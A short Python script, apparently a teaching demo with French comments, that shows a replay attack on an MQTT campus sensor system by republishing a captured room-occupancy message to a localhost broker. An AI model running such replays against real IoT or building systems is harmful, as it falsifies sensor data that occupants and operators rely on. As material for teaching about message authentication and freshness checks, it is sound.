import paho.mqtt.client as mqtt
import json
import time

client = mqtt.Client()
client.connect("localhost", 1883, 60)

# Message "légitime" capturé plus tôt (simulé ici en dur pour l'exemple)
message_capture = {
    "salle": "A101",
    "temperature": 24.5,
    "presence": True,
    "timestamp": "2026-08-07T10:15:00"  # heure d'origine du message
}

print(f"[MESSAGE CAPTURÉ] {message_capture}")
print("Attente avant rejeu (simulate un délai de plusieurs heures)...")
time.sleep(5)  # dans la vraie vie, ce serait des heures plus tard

# L'attaquant rejoue le même message tel quel, plus tard
print(f"[REJEU] Rejoue le message capturé, timestamp original : {message_capture['timestamp']}")
client.publish("campus/A101/data", json.dumps(message_capture))
print("[REJEU] Message republié → le système croit la salle A101 encore occupée")